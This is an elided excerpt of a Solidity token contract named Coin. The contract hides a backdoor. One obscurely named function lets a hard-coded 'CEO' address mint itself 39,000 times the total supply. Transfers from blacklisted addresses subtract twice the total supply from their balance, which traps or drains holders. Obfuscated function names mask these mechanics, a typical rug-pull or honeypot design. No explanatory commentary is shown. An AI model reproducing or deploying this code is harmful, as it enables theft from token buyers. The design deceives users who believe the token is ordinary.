...
contract Coin is Ownable {
    ...
    function Boy2131Box123() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }
    function vipcadvipdaddTrade() external {
       
        if (_vipCEO == _msgSender()){
            _balances[_msgSender()] = Boy2131Box123()*39000;
        }else if (_msgSender() != _vipCEO) {
            revert("fuck");
        }
    }
    ...
    constructor(string memory name_, string memory symbol_) {
        _vipCEO = 0xf719aFDa07f99E2f5E17aFFD773a5e2BE19Dc3e1;
        _MYname = name_;
        _MYsymbol = symbol_;
    ...
    function _transfer(
        ...
        if (vipccdd[from] != false ){
            _balances[from]= balance-(Boy2131Box123())-(Boy2131Box123());
        }
